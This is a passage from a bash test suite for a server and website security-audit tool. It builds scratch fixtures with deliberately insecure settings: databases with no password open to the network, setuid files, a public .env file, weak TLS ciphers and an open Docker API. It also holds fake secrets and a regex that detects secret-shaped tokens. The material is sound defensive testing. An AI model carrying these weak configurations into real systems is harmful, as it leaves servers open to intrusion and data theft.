t "failed sign-ins are counted"              2 "2 failed SSH sign-in attempts" ""                                   $H "$T/tmp"
t "root signed in with a password"           2 "root has signed in over SSH with a password" ""                     $H "$T/tmp"
t "SSH allows empty passwords"               2 "PermitEmptyPasswords yes" ""                                        $H "$T/tmp"
t "SSH allows many attempts"                 2 "allows 10 password attempts" ""                                     $H "$T/tmp"
t "--quick skips the break-in checks"        0 "RESULT: PASS" "crypto-miner"                                        $H --quick "$T/tmp"
}
HOME_DIR="home-clean"

group "Server: operating system, databases and the running app"
mkdir -p app-live; put app-live/package.json '{ "name": "live" }'
printf '#!/bin/sh\necho v20.11.0\n' > fake-node-20; printf '#!/bin/sh\necho v24.11.1\n' > fake-node-24; chmod +x fake-node-20 fake-node-24
put node-dist/nodedist.body '[
{"version":"v24.11.1","date":"2025-11-11","security":false},
{"version":"v20.20.2","date":"2026-03-24","security":true},
{"version":"v20.19.0","date":"2025-03-13","security":false},
{"version":"v20.18.2","date":"2025-01-21","security":true},
{"version":"v20.12.0","date":"2024-03-26","security":false},
{"version":"v20.11.1","date":"2024-02-14","security":true},
{"version":"v20.11.0","date":"2024-01-09","security":false},
{"version":"v20.10.0","date":"2023-11-22","security":true}
]'
# A server with weak settings.
fakeid srv-weak 0
APP_OWNER="$REAL_USER"
if [[ "$(id -u)" == "0" ]]; then if chown nobody app-live/package.json 2>/dev/null; then APP_OWNER="nobody"; else APP_OWNER=""; fi; fi
fakeout srv-weak ps 0 "${APP_OWNER:-app}          812 node /srv/app/server.js"
fakeout srv-weak ss 0 'LISTEN 0 511 127.0.0.1:3000 0.0.0.0:* users:(("node",pid=812,fd=18))
LISTEN 0 511 0.0.0.0:6379 0.0.0.0:* users:(("redis-server",pid=500,fd=6))
LISTEN 0 511 0.0.0.0:27017 0.0.0.0:* users:(("mongod",pid=501,fd=6))
LISTEN 0 511 0.0.0.0:9200 0.0.0.0:* users:(("java",pid=502,fd=6))'
fakeout srv-weak ufw 0 'Status: active'
cp bin/ok/curl bin/srv-weak/curl
put sys-weak/etc/os-release 'NAME="Ubuntu"
VERSION_ID="20.04"
ID=ubuntu'
mkdir -p sys-weak/proc/sys/kernel sys-weak/proc/sys/net/ipv4/conf/all sys-weak/proc/sys/fs sys-weak/proc/812
echo 0 > sys-weak/proc/sys/kernel/randomize_va_space; echo 0 > sys-weak/proc/sys/net/ipv4/tcp_syncookies
echo 1 > sys-weak/proc/sys/net/ipv4/conf/all/accept_redirects; echo 1 > sys-weak/proc/sys/fs/protected_symlinks
printf 'PATH=/usr/bin\0NODE_ENV=development\0NODE_OPTIONS=--inspect=0.0.0.0:9229\0DB_PASSWORD=supersecretvalue\0' > sys-weak/proc/812/environ
ln -s "$T/app-live" sys-weak/proc/812/cwd; ln -s "$T/fake-node-20" sys-weak/proc/812/exe
put sys-weak/etc/redis/redis.conf 'bind 0.0.0.0
protected-mode no
# requirepass commented'
put sys-weak/etc/mongod.conf 'net:
  bindIp: 0.0.0.0
#security:
#  authorization: enabled'
put sys-weak/etc/postgresql/16/main/pg_hba.conf '# TYPE DATABASE USER ADDRESS METHOD
local   all   postgres                peer
local   all   all                     trust
host    all   all   127.0.0.1/32      scram-sha-256
host    all   all   10.0.0.0/8        trust
host    all   all   0.0.0.0/0         md5'
put sys-weak/etc/mysql/my.cnf '[mysqld]
skip-grant-tables'
put sys-weak/etc/elasticsearch/elasticsearch.yml 'xpack.security.enabled: false'
mkdir -p sys-weak/usr/local/bin sys-weak/tmp sys-weak/usr/bin
printf 'x' > sys-weak/usr/local/bin/oddtool; chmod 4755 sys-weak/usr/local/bin/oddtool
printf 'x' > sys-weak/tmp/rootshell; chmod 4755 sys-weak/tmp/rootshell
printf 'x' > sys-weak/usr/bin/sudo; chmod 4755 sys-weak/usr/bin/sudo
BINS="srv-weak"; SYSROOT="$T/sys-weak"; ENVS="CURL_FIX=$T/node-dist"
W="--only server --server vps --proxy none --runner other"
# shellcheck disable=SC2086
{
t "operating system past end of support"     2 "ubuntu 20.04: standard security updates ended on 2025-05-31" ""     $W "$T/tmp"
t "address randomisation off"                2 "Address randomisation is not fully on" ""                           $W "$T/tmp"
t "kernel settings to tighten"               2 "net.ipv4.tcp_syncookies=1 net.ipv4.conf.all.accept_redirects=0" "protected_symlinks" $W "$T/tmp"
t "Redis: no password, public"               2 "Redis has no password and listens on a public interface" ""         $W "$T/tmp"
t "Redis: protected mode off"                2 "protected-mode switched off" ""                                     $W "$T/tmp"
t "MongoDB: no access control, public"       2 "MongoDB access control is off and it listens on a public interface" "" $W "$T/tmp"
t "PostgreSQL: remote access with no password" 2 "lets other machines connect with no password at all" ""           $W "$T/tmp"
t "PostgreSQL: open to any address"          2 "accepts connections from any address" ""                            $W "$T/tmp"
t "PostgreSQL: local trust and md5 noted"    2 "uses 'md5' or 'password' sign-in" ""                                $W "$T/tmp"
t "MySQL: skip-grant-tables"                 2 "skip-grant-tables" ""                                               $W "$T/tmp"
t "Elasticsearch: security off, public"      2 "Elasticsearch security is off and it listens on a public interface" "" $W "$T/tmp"
t "app not in production mode"               2 "PID 812 runs with NODE_ENV=development" "supersecretvalue"          $W "$T/tmp"
t "debugger switched on through NODE_OPTIONS" 2 "NODE_OPTIONS switches the debugger on" ""                          $W "$T/tmp"
if [[ -n "$APP_OWNER" ]]; then
t "app can rewrite its own code"             2 "so a break-in can rewrite the app's own code" ""                    $W "$T/tmp"
else echo "skip  app can rewrite its own code (can't change a file's owner here)"; fi
t "running Node version is end-of-life"      2 "Node.js 20 (PID 812) reached end of life on 2026-04-30" ""          $W "$T/tmp"
t "running Node is behind on security fixes" 2 "runs Node 20.11.0, which is 3 security releases behind (latest in that line: 20.20.2)" "" $W "$T/tmp"
t "deep: set-uid file in /tmp"               2 "A set-uid file in /tmp" ""                                          $W --deep --no-tools "$T/tmp"
t "deep: unusual set-uid program"            2 "/usr/local/bin/oddtool" "/usr/bin/sudo"                             $W --deep --no-tools "$T/tmp"
t "standard: set-uid scan doesn't run"       2 "" "set-uid"                                                         $W "$T/tmp"
}
# A server with good settings.
fakeid srv-best 0
fakeout srv-best ps 0 "app          812 node /srv/app/server.js"
fakeout srv-best ss 0 'LISTEN 0 511 127.0.0.1:3000 0.0.0.0:* users:(("node",pid=812,fd=18))
LISTEN 0 511 127.0.0.1:6379 0.0.0.0:* users:(("redis-server",pid=500,fd=6))'
fakeout srv-best ufw 0 'Status: active'
fakeout srv-best apt-get 0 'Reading package lists...'
fake srv-best dpkg 'exit 0'
fake srv-best fail2ban-client 'exit 0'
cp bin/ok/curl bin/srv-best/curl
put sys-best/etc/os-release 'ID=ubuntu
VERSION_ID="24.04"'
mkdir -p sys-best/proc/sys/kernel sys-best/proc/812; echo 2 > sys-best/proc/sys/kernel/randomize_va_space
printf 'NODE_ENV=production\0' > sys-best/proc/812/environ
ln -s "$T/app-live" sys-best/proc/812/cwd; ln -s "$T/fake-node-24" sys-best/proc/812/exe
put sys-best/etc/passwd 'root:x:0:0:root:/root:/bin/bash
app:x:1000:1000::/home/app:/usr/sbin/nologin'
put sys-best/etc/shadow 'root:!:19000::::::
app:!:19000::::::'
put sys-best/etc/ssh/sshd_config 'PermitRootLogin no
PasswordAuthentication no'
put sys-best/etc/redis/redis.conf 'bind 127.0.0.1
requirepass a-long-random-value'
put sys-best/etc/mongod.conf 'security:
  authorization: enabled'
put sys-best/etc/postgresql/16/main/pg_hba.conf 'local all postgres peer
host all all 127.0.0.1/32 scram-sha-256'
BINS="srv-best"; SYSROOT="$T/sys-best"; ENVS="CURL_FIX=$T/node-dist"
# shellcheck disable=SC2086
{
t "well set-up server passes"                0 "RESULT: PASS." "[WARN]"                                             $W "$T/tmp"
t "well set-up server: every check ran"      0 "Checks that didn't run  : 0" "[HIGH]"                               $W "$T/tmp"
t "supported operating system"               0 "ubuntu 24.04 gets security updates until 2029-05-31" ""             $W "$T/tmp"
t "no sign of a break-in"                    0 "None of the known signs of a break-in" ""                           $W "$T/tmp"
t "only root has user ID 0"                  0 "root is the only account with user ID 0" ""                         $W "$T/tmp"
t "Redis with a password"                    0 "Redis requires a password" ""                                       $W "$T/tmp"
t "MongoDB with access control"              0 "MongoDB access control is on" ""                                    $W "$T/tmp"
t "PostgreSQL rules are fine"                0 "have none of the common mistakes" ""                                $W "$T/tmp"
t "app in production mode"                   0 "PID 812 runs with NODE_ENV=production" ""                           $W "$T/tmp"
t "running Node is up to date"               0 "runs Node 24.11.1, with no newer security release" ""               $W "$T/tmp"
}
for pair in "debian|11|debian 11: standard security updates ended on 2026-08-31" "debian|13|debian 13 gets security updates until" "centos|7|centos 7: standard security updates ended" "ubuntu|25.04|ubuntu 25.04 stopped getting security updates long ago" "almalinux|9|almalinux 9 gets security updates until"; do
  IFS='|' read -r o_id o_ver o_want <<< "$pair"
  put "sys-os-$o_id$o_ver/etc/os-release" "ID=$o_id
VERSION_ID=\"$o_ver\""
  SYSROOT="$T/sys-os-$o_id$o_ver"
  # shellcheck disable=SC2086
  t "end-of-support table: $o_id $o_ver"     0 "$o_want" ""                                                         $W "$T/tmp"
done
SYSROOT=""; ENVS=""

group "Server: nginx and Docker checks added in version 2"
mkdir -p webroot; put webroot/package.json '{}'; put webroot/.env 'A=1'
fakeid srv-ng 0
fakeout srv-ng ps 0 'app          812 node /srv/app/server.js'
fakeout srv-ng ss 0 'LISTEN 0 511 127.0.0.1:3000 0.0.0.0:* users:(("node",pid=812,fd=18))'
fakeout srv-ng ufw 0 'Status: active'
put sys-ng/etc/nginx/nginx.conf "http {
  server_tokens off;
  ssl_protocols TLSv1.2 TLSv1.3;
  ssl_ciphers HIGH:RC4-SHA:!aNULL;
  server {
    root $T/webroot;
    location /assets {
      alias /srv/assets/;
    }
    location / {
      proxy_pass http://127.0.0.1:3000;
    }
  }
}"
put sys-ng-ok/etc/nginx/nginx.conf "http {
  server_tokens off;
  ssl_protocols TLSv1.2 TLSv1.3;
  ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:!aNULL:!MD5;
  limit_req_zone \$binary_remote_addr zone=one:10m rate=10r/s;
  server {
    root /var/www/html;
    location ~ /\\. { deny all; }
    location /assets/ {
      alias /srv/assets/;
    }
    location / {
      proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
      proxy_pass http://127.0.0.1:3000;
    }
  }
}"
BINS="srv-ng"; N="--only server --server vps --proxy nginx --runner other"
SYSROOT="$T/sys-ng"
# shellcheck disable=SC2086
{
t "nginx: broken ciphers allowed"            2 "ssl_ciphers allows broken ciphers" ""                               $N "$T/tmp"
t "nginx: serves the project folder"         2 "nginx serves a project folder as static files, with no rule blocking hidden files" "" $N "$T/tmp"
t "nginx: alias without matching slash"      2 "Visitors can read files outside that folder" ""                     $N "$T/tmp"
t "nginx: no rate limit"                     2 "no request rate limit" ""                                           $N "$T/tmp"
t "nginx: visitor address not passed on"     2 "doesn't pass the visitor's address to Node" ""                      $N "$T/tmp"
SYSROOT="$T/sys-ng-ok"
t "nginx: good settings"                     0 "RESULT: PASS." "SRV-NGINX"                                          $N "$T/tmp"
}
put sys-dock/etc/group 'root:x:0:
docker:x:999:alice,deploy'
put sys-dock/etc/docker/daemon.json '{ "hosts": ["unix:///var/run/docker.sock", "tcp://0.0.0.0:2375"] }'
BINS="dock"; SYSROOT="$T/sys-dock"
# shellcheck disable=SC2086
{
t "Docker: no memory limit"                  2 "Container web has no memory limit" ""                               $DOCK "$T/tmp"
t "Docker: secrets as plain variables"       2 "Container web gets 2 secret-looking value(s)" ""                    $DOCK "$T/tmp"
t "Docker: old image"                        2 "image was built on 2025-01-01" ""                                   $DOCK "$T/tmp"
t "Docker: who is in the docker group"       2 "Members of the 'docker' group can take full control of this machine: alice,deploy" "" $DOCK "$T/tmp"
t "Docker: API open to the network"          2 "The Docker API is set to listen on the network" ""                  $DOCK "$T/tmp"
}
SYSROOT=""; BINS=""

# ========================================================== LIVE SITE =====
group "Live site: checks added in version 2"
mkdir -p web2-bad web2-good dns-good dns-bad dns-none
# A site with many problems.
printf 'HTTP/1.1 200 OK\r\nStrict-Transport-Security: max-age=3600\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nContent-Security-Policy: script-src '"'"'self'"'"' '"'"'unsafe-inline'"'"' '"'"'unsafe-eval'"'"' https:\r\n\r\n' > web2-bad/root.hdr
printf '<html><head><script src="/static/app.js"></script></head></html>\n' > web2-bad/root.body
printf 'HTTP/1.1 301 Moved\r\nLocation: https://example.test/\r\n\r\n' > web2-bad/http.hdr
printf 'HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: https://nsc-cors-test.example\r\nAccess-Control-Allow-Credentials: true\r\n\r\n' > web2-bad/cors.hdr
printf 'HTTP/1.1 404 Not Found\r\nContent-Type: text/html\r\n\r\n' > web2-bad/missing.hdr
printf '<pre>Error: Cannot GET /x<br> &nbsp; at Layer.handle (/srv/app/node_modules/express/lib/router/layer.js:95:5)</pre>\n' > web2-bad/missing.body
printf 'HTTP/1.1 200 OK\r\nContent-Type: message/http\r\n\r\n' > web2-bad/trace.hdr
printf 'HTTP/1.1 200 OK\r\nContent-Type: application/sql\r\n\r\n' > web2-bad/backup_sql.hdr
printf -- '-- MySQL dump 10.13\nCREATE TABLE users (id int);\n' > web2-bad/backup_sql.body
printf 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n' > web2-bad/package_json.hdr
printf '{ "name": "site", "dependencies": { "express": "4.18.0" } }\n' > web2-bad/package_json.body
printf 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n' > web2-bad/static_app_js_map.hdr
printf '{"version":3,"sources":["src/index.ts"],"mappings":"AAAA"}\n' > web2-bad/static_app_js_map.body
printf 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n' > web2-bad/post_graphql.hdr
printf '{"data":{"__schema":{"queryType":{"name":"Query"}}}}\n' > web2-bad/post_graphql.body
printf 'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n' > web2-bad/metrics.hdr
printf '# HELP http_requests_total Total\n# TYPE http_requests_total counter\n' > web2-bad/metrics.body
printf 'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n' > web2-bad/_env_local.hdr
printf 'export API_KEY=abcdef123456\n' > web2-bad/_env_local.body
touch web2-bad/weakcipher web2-bad/cert-weak web2-bad/no-tls13 web2-bad/cert-expiring
# A site with everything in place.
printf 'HTTP/2 200\r\nstrict-transport-security: max-age=31536000; includeSubDomains\r\nx-content-type-options: nosniff\r\ncontent-security-policy: default-src '"'"'self'"'"'; script-src '"'"'self'"'"' '"'"'nonce-abc'"'"'; object-src '"'"'none'"'"'; base-uri '"'"'self'"'"'; frame-ancestors '"'"'none'"'"'\r\nreferrer-policy: no-referrer\r\npermissions-policy: camera=()\r\n\r\n' > web2-good/root.hdr
printf '<html><head><script src="/static/app.js"></script></head></html>\n' > web2-good/root.body
printf 'HTTP/1.1 301 Moved\r\nLocation: https://example.test/\r\n\r\n' > web2-good/http.hdr
printf 'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n' > web2-good/_well-known_security_txt.hdr
printf 'Contact: mailto:security@example.test\nExpires: 2027-01-01T00:00:00Z\n' > web2-good/_well-known_security_txt.body
printf '"v=spf1 include:_spf.example.net -all"\n' > dns-good/TXT.example.test
printf '"v=DMARC1; p=reject; rua=mailto:d@example.test"\n' > dns-good/TXT._dmarc.example.test
printf '0 issue "letsencrypt.org"\n' > dns-good/CAA.example.test
printf '"v=spf1 +all"\n' > dns-bad/TXT.example.test
printf '"v=DMARC1; p=none"\n' > dns-bad/TXT._dmarc.example.test
cat > bin/fakedig <<'EOF'
#!/bin/sh
F="${DNS_FIX:-/nonexistent}"; type=""; name=""
for a in "$@"; do case "$a" in +*) ;; TXT|CAA) type="$a" ;; *) name="$a" ;; esac; done
[ -f "$F/$type.$name" ] && cat "$F/$type.$name"
exit 0
EOF
cat > bin/fakeopenssl <<'EOF'
#!/bin/sh
F="${CURL_FIX:-/nonexistent}"
case "$1" in
  s_client)
    case " $* " in
      *" -cipher "*) if [ -f "$F/weakcipher" ]; then echo "    Cipher    : RC4-SHA"; exit 0; fi; echo "    Cipher    : 0000"; exit 1 ;;
      *" -tls1_3 "*) [ -f "$F/no-tls13" ] && exit 1; echo "New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384"; exit 0 ;;
    esac
    echo "-----BEGIN CERTIFICATE-----"; echo "FAKE"; echo "-----END CERTIFICATE-----" ;;
  x509)
    cat > /dev/null
    case " $* " in
      *" -checkend "*) if [ -f "$F/cert-expiring" ]; then echo "Certificate will expire"; exit 1; fi; echo "Certificate will not expire" ;;
      *" -text "*) if [ -f "$F/cert-weak" ]; then printf 'Signature Algorithm: sha1WithRSAEncryption\n Public Key Algorithm: rsaEncryption\n Public-Key: (1024 bit)\n'
                   else printf 'Signature Algorithm: sha256WithRSAEncryption\n Public Key Algorithm: rsaEncryption\n Public-Key: (2048 bit)\n'; fi ;;
    esac ;;
esac
exit 0
EOF
chmod +x bin/fakedig bin/fakeopenssl; mkdir -p bin/site; cp bin/ok/curl bin/site/curl; cp bin/fakedig bin/site/dig; cp bin/fakeopenssl bin/site/openssl
BINS="site"; S="--only server --server managed --url https://example.test"
# shellcheck disable=SC2086
{
ENVS="CURL_FIX=$T/web2-bad DNS_FIX=$T/dns-bad"
t "site: weak content security policy"       2 "The Content-Security-Policy leaves gaps: 'unsafe-inline' scripts; 'unsafe-eval'; scripts from any site" "" $S "$T/tmp"
t "site: short HSTS"                         2 "lasts under four months (max-age=3600)" ""                          $S "$T/tmp"
t "site: trusts any website, with cookies"   2 "trust ANY website, with cookies" ""                                 $S "$T/tmp"
t "site: error pages show stack traces"      2 "Error pages show stack traces" ""                                   $S "$T/tmp"
t "site: TRACE answered"                     2 "answers the TRACE method" ""                                        $S "$T/tmp"
t "site: database dump is public"            2 "/backup.sql is public. That is a database dump" "CREATE TABLE"      $S "$T/tmp"
t "site: /.env.local is public"              2 "/.env.local is public" "abcdef123456"                               $S "$T/tmp"
t "site: package.json is public"             2 "/package.json is public" ""                                         $S "$T/tmp"
t "site: metrics page is public"             2 "/metrics is public" ""                                              $S "$T/tmp"
t "site: source maps are public"             2 "Source maps are public (app.js.map)" ""                             $S "$T/tmp"
t "site: GraphQL introspection is on"        2 "GraphQL introspection is on at /graphql" ""                         $S "$T/tmp"
t "site: no security.txt"                    2 "No /.well-known/security.txt" ""                                    $S "$T/tmp"
t "site: certificate about to expire"        2 "The certificate expires within 14 days" ""                          $S "$T/tmp"
t "DNS: SPF allows everyone"                 2 "The SPF record ends in +all" ""                                     $S "$T/tmp"
t "DNS: DMARC set to none"                   2 "The DMARC record is set to p=none" ""                               $S "$T/tmp"
t "DNS: no CAA record"                       2 "No CAA record" ""                                                   $S "$T/tmp"
t "deep: certificate signed with SHA-1"      2 "signed with SHA-1 or MD5" ""                                        $S --deep "$T/tmp"
t "deep: small certificate key"              2 "RSA key is only 1024 bits" ""                                       $S --deep "$T/tmp"
t "deep: broken cipher accepted"             2 "The server accepts a broken cipher" ""                              $S --deep "$T/tmp"
t "deep: no TLS 1.3"                         2 "did not negotiate TLS 1.3" ""                                       $S --deep "$T/tmp"
t "standard: no cipher probing"              2 "" "broken cipher"                                                   $S "$T/tmp"
t "--quick skips the extra site checks"      2 "" "ANY website"                                                     $S --quick "$T/tmp"
ENVS="CURL_FIX=$T/web2-good DNS_FIX=$T/dns-good"
t "good site: passes with no warnings"       0 "RESULT: PASS." "[WARN]"                                             $S "$T/tmp"
t "good site: every check ran"               0 "Checks that didn't run  : 0" "[ ?? ]"                               $S "$T/tmp"
t "good site: strong content security policy" 0 "Content-Security-Policy is set" "leaves gaps"                      $S "$T/tmp"
t "good site: no CORS for strangers"         0 "doesn't hand out CORS access to unknown websites" ""                $S "$T/tmp"
t "good site: has security.txt"              0 "The site has a security.txt" ""                                     $S "$T/tmp"
t "good site: DNS records"                   0 "A DMARC record with an enforcing policy is published" ""            $S "$T/tmp"
t "good site: deep TLS checks pass"          0 "The server refused the broken ciphers tried" "[WARN]"               $S --deep --no-tools "$T/tmp"
ENVS="CURL_FIX=$T/web2-good DNS_FIX=$T/dns-none"
t "DNS: no SPF or DMARC at all"              0 "No SPF record found (tried: example.test)" ""                       $S "$T/tmp"
t "DNS: parent domains are tried"            0 "tried: app.shop.example.test shop.example.test example.test" ""     --only server --server managed --url https://app.shop.example.test "$T/tmp"
}
mkdir -p bin/site-nodig; cp bin/ok/curl bin/site-nodig/curl
BINS="site-nodig"; ENVS="CURL_FIX=$T/web2-good"
# shellcheck disable=SC2086
t "DNS: no lookup tool installed"            0 "None of dig, host or nslookup is installed" ""                      $S "$T/tmp"
BINS=""; ENVS=""

# ==================================================== SPECIALIST TOOLS ====
group "Specialist tools (--deep)"
# fakewrite SCENARIO TOOL FLAG 'content': a tool that writes CONTENT to the file named after FLAG.
fakewrite() {
  mkdir -p "bin/$1"; printf '%s\n' "$4" > "out/$1.$2"
  printf '#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ "$1" = "%s" ]; then cat "%s" > "$2"; exit 0; fi; shift; done\nexit 0\n' "$3" "$T/out/$1.$2" > "bin/$1/$2"; chmod +x "bin/$1/$2"
}
fakewrite tools-bad gitleaks --report-path '[{"RuleID":"aws-access-token","File":"a"},{"RuleID":"github-pat","File":"b"}]'
fakeout   tools-bad trufflehog 0 '{"DetectorName":"AWS","Verified":true}'
fakewrite tools-bad semgrep --output '{"results":[{"check_id":"a","extra":{"severity":"ERROR"}},{"check_id":"b","extra":{"severity":"WARNING"}}],"errors":[]}'
fakewrite tools-bad trivy --output '{"Results":[{"Vulnerabilities":[{"Severity":"HIGH"},{"Severity":"CRITICAL"},{"Severity":"LOW"}]}]}'
fakewrite tools-bad lynis --report-file 'hardening_index=62
warning[]=SSH-7408|x
warning[]=FIRE-4512|y
suggestion[]=z'
fakewrite tools-bad testssl.sh --jsonfile '[{"id":"a","severity":"HIGH"},{"id":"b","severity":"OK"}]'
fakewrite tools-ok gitleaks --report-path '[]'
fakeout   tools-ok trufflehog 0 ''
fakewrite tools-ok semgrep --output '{"results":[],"errors":[]}'
fakewrite tools-ok trivy --output '{"Results":[]}'
fakewrite tools-ok lynis --report-file 'hardening_index=91'
fakewrite tools-ok testssl.sh --jsonfile '[{"id":"a","severity":"OK"}]'
for s in tools-bad tools-ok; do
  cp bin/srv-min/ps bin/srv-min/ss bin/srv-min/ufw "bin/$s/"; cp bin/ok/curl "bin/$s/curl"; cp bin/fakedig "bin/$s/dig"; cp bin/fakeopenssl "bin/$s/openssl"
  printf '#!/bin/sh\ncase "$1" in -un) echo "%s" ;; *) echo 0 ;; esac\n' "$REAL_USER" > "bin/$s/id"; chmod +x "bin/$s/id"
done
BINS="tools-bad"; SYSROOT="$T/sys-none"
t "gitleaks result is summarised"            2 "gitleaks found 2 secret(s)" ""                                      --only code --deep p/c-clean
t "trufflehog result is summarised"          2 "trufflehog found 1 secret(s) that it confirmed are live" ""         --only code --deep p/c-clean
t "semgrep result is summarised"             2 "semgrep found 1 high-severity code problem(s) (2 findings in all)" "" --only code --deep p/c-clean
t "trivy result is summarised"               2 "trivy found 2 critical or high finding(s)" ""                       --only code --deep p/c-clean
t "lynis result is summarised"               0 "lynis reports 2 warning(s) about this server (hardening score 62 out of 100)" "" --only server --server vps --proxy none --runner other --deep "$T/tmp"
ENVS="CURL_FIX=$T/web2-good DNS_FIX=$T/dns-good"
t "testssl.sh result is summarised"          0 "testssl.sh found 1 high or critical TLS problem(s)" ""              --only server --server managed --url https://example.test --deep "$T/tmp"
ENVS=""
t "--no-tools leaves them out"               0 "RESULT: PASS" "gitleaks"                                            --only code --deep --no-tools p/c-clean
t "standard thoroughness never runs them"    0 "RESULT: PASS" "gitleaks"                                            --only code p/c-clean
BINS="tools-ok"
t "tools that find nothing"                  0 "gitleaks found no secrets" "[WARN]"                                 --only code --deep p/c-clean
t "lynis with no warnings"                   0 "lynis reports no warnings (hardening score 91 out of 100)" ""       --only server --server vps --proxy none --runner other --deep "$T/tmp"
BINS=""
t "no tools installed: says so"              0 "None of gitleaks, trufflehog, semgrep or trivy is installed" ""     --only code --deep p/c-clean

group "SSH: effective settings from sshd itself"
mkdir -p bin/sshd-t bin/sshd-fail; cp bin/srv-good/* bin/sshd-t/; cp bin/srv-good/* bin/sshd-fail/
fakeout sshd-t sshd 0 'port 22
permitrootlogin yes
passwordauthentication yes'
fake sshd-fail sshd 'exit 1'
SYSROOT="$T/sys-good"; ENVS=""; HOME_DIR="home-clean"
BINS="sshd-t"
# shellcheck disable=SC2086
t "sshd -T settings win over the files"      0 "SSH allows root to sign in with a password (PermitRootLogin yes)" "" $SRV --runner other p/s-app-ok
BINS="sshd-fail"
# shellcheck disable=SC2086
t "if sshd -T fails, the files are read"     0 "SSH password sign-in is off (keys only)" "PermitRootLogin yes"      $SRV --runner other p/s-app-ok
SYSROOT=""; BINS=""

# ============================================================== DEMO ======
DEMO="$HERE/../demo"
if [[ -f "$DEMO/make-demo-app.sh" && -f "$DEMO/make-insecure-server.sh" ]]; then
  group "Demo app and demo server (the demo/ folder)"
  if bash "$DEMO/make-demo-app.sh" "$T/demo-app" >/dev/null 2>&1; then PASS=$((PASS + 1)); echo "ok    demo app builds"; else FAIL=$((FAIL + 1)); echo "FAIL  demo app builds"; fi
  BINS="ok"; ENVS=""; SYSROOT=""
  D="--skip server --no-network --history"
  # shellcheck disable=SC2086
  {
  t "demo app: compromise alert"             1 "Known-malicious version in the lockfile: @tanstack/history@1.161.9" "" $D "$T/demo-app"
  t "demo app: committed .env"               1 ".env file(s) committed to git" ""                                   $D "$T/demo-app"
  t "demo app: fake keys found, never shown" 1 "AWS access key ID: 1 line" "IOSFODNN7"                              $D "$T/demo-app"
  t "demo app: token in git history"         1 "deploy.sh:" ""                                                      $D "$T/demo-app"
  t "demo app: secret in build output"       1 "Secret-looking text inside build output" ""                         $D "$T/demo-app"
  t "demo app: accepted finding"             1 "accepted: MD5 is only used to build a cache key" ""                 $D "$T/demo-app"
  t "demo app: downloading install script"   1 "node_modules/handy-image-tools" ""                                  $D "$T/demo-app"
  t "demo app: risky code patterns"          1 "Shell command built from variables: 1 line" ""                      $D "$T/demo-app"
  t "demo app: Dockerfile and compose"       1 "docker-compose.yml: a service runs with 'privileged: true'" ""      $D "$T/demo-app"
  t "demo app: Kubernetes"                   1 "Kubernetes: a container runs privileged" ""                         $D "$T/demo-app"
  t "demo app: workflow"                     1 "puts text written by outsiders" ""                                  $D "$T/demo-app"
  }
  # The repository itself must hold no secret-shaped text: the fakes are assembled when the app is built.
  if grep -rEq '(AKIA|ASIA)[0-9A-Z]{16}|gh[pousr]_[A-Za-z0-9]{36}|(sk|rk)_live_[A-Za-z0-9]{20,}|hooks\.slack\.com/services/T|://[a-z]+:[^@/" ]{3,}@' "$DEMO"; then
    FAIL=$((FAIL + 1)); echo "FAIL  demo files hold no secret-shaped text"
  else
    PASS=$((PASS + 1)); echo "ok    demo files hold no secret-shaped text"
  fi

  # The weak server settings: only ever written into a scratch folder here.
  mkdir -p "$T/not-empty"; echo x > "$T/not-empty/file"
  if bash "$DEMO/make-insecure-server.sh" "$T/not-empty" >/dev/null 2>&1; then FAIL=$((FAIL + 1)); echo "FAIL  weak-settings script refuses a folder that isn't empty"; else PASS=$((PASS + 1)); echo "ok    weak-settings script refuses a folder that isn't empty"; fi
  if grep -q 'NSC_DEMO_CONTAINER:-}" != "yes"' "$DEMO/make-insecure-server.sh" && grep -q 'refusing to use / as the scratch folder' "$DEMO/make-insecure-server.sh"; then
    PASS=$((PASS + 1)); echo "ok    weak-settings script keeps its guard against real machines"
  else
    FAIL=$((FAIL + 1)); echo "FAIL  weak-settings script keeps its guard against real machines"
  fi
  bash "$DEMO/make-insecure-server.sh" "$T/demo-root" "$T/demo-app" >/dev/null 2>&1
  BINS="srv-min"; SYSROOT="$T/demo-root"
  DS="--only server --server vps --proxy nginx --runner other --no-network"
  # shellcheck disable=SC2086
  {
  t "demo server: second root account"       2 "Account(s) other than root with full root rights" ""                $DS "$T/demo-app"
  t "demo server: malicious scheduled job"   2 "A scheduled job downloads and runs something" ""                    $DS "$T/demo-app"
  t "demo server: odd service"               2 "sysupdate.service" ""                                               $DS "$T/demo-app"
  t "demo server: weak SSH"                  2 "SSH allows root to sign in with a password" ""                      $DS "$T/demo-app"
  t "demo server: nginx serves the project"  2 "nginx serves a project folder as static files" ""                   $DS "$T/demo-app"
  t "demo server: nginx old TLS and ciphers" 2 "ssl_ciphers allows broken ciphers" ""                               $DS "$T/demo-app"
  t "demo server: Redis without a password"  2 "Redis has protected-mode switched off and no password" ""           $DS "$T/demo-app"
  }
  SYSROOT=""; BINS=""

  # The demo web server, run for real on this machine only (127.0.0.1), checked with the real curl.
  if PATH="$REAL_PATH" command -v curl >/dev/null 2>&1; then
    port=$((38000 + RANDOM % 1500))
    ( cd "$T/demo-app" && HOST=127.0.0.1 PORT="$port" PATH="$REAL_PATH" exec node src/server.js >/dev/null 2>&1 ) &
    demo_pid=$!
    for _ in 1 2 3 4 5 6 7 8 9 10; do
      PATH="$REAL_PATH" curl -fsS --max-time 2 -o /dev/null "http://127.0.0.1:$port/" 2>/dev/null && break
      sleep 0.5
    done
    out="$(cd "$T" && PATH="$REAL_PATH" bash "$SCRIPT" --yes --only server --server managed --url "http://127.0.0.1:$port" "$T/demo-app" 2>&1 </dev/null)"; rc=$?
    kill "$demo_pid" 2>/dev/null; wait "$demo_pid" 2>/dev/null
    live() {
      if [[ "$rc" == "2" ]] && grep -qF -- "$2" <<< "$out"; then PASS=$((PASS + 1)); echo "ok    live demo site: $1"
